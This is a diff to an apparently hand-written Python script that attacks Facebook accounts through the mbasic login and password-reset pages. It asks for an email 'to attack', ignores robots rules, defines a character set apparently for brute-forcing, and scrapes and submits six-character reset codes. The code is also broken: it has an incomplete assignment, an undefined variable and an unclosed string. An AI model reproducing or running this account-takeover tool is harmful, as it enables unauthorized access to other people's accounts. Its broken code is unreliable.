@@ -2,7 +2,7 @@ import itertools
 import sys
 from time import sleep
 from bs4 import BeautifulSoup
-
+import requests
 import mechanize
 
 CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
@@ -13,6 +13,8 @@ MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
 
 LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'
 
+page = requests.get(sample_web_page)
+soup1 = 
 def __init__(self):
     self.browser = self.setup_browser()
 
@@ -48,7 +50,6 @@ def try_password(self, email, password):
 soup = BeautifulSoup()
 email = input('Email address or username to attack:')
 """password = input('Password:')"""
-reset = input('Reset:')
 browser = mechanize.Browser()
 browser.set_handle_robots(False)
 cookies = mechanize.CookieJar()
@@ -73,6 +74,9 @@ y = input('Continue? 1,2, else:')
 """reset code input"""
 browser.select_form(nr=0)
 print(browser.geturl())
+page = requests.get(browser.geturl())
+soup1 = BeautifulSoup(page.content, "html.parser")
+print(soup1.find(string="6 characters long:))
 reset = input('Code: ')
 browser.form['n'] = reset
 browser.submit()
